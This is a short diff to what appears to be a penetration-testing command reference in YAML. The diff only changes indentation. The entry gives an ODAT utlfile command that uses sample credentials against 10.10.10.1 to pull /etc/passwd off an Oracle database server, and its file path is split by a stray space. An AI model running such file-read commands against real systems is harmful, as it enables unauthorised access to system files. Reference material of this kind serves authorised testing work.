@@ -4,17 +4,17 @@ description: |
 
   Command Reference:
     
-    Target: 10.10.10.1
+      Target: 10.10.10.1
 
-    Database: oracle
+      Database: oracle
 
-    User: john
+      User: john
 
-    Password: password123
+      Password: password123
 
-    Download file: /etc/passwd
+      Download file: /etc/passwd
 
-    Output file: passwd.txt
+      Output file: passwd.txt
 
 command: |
   ./odat.py utlfile -s 10.10.10.1 -d oracle -U john -P password123 --test-module --getFile /etc/ passwd passwd.txt
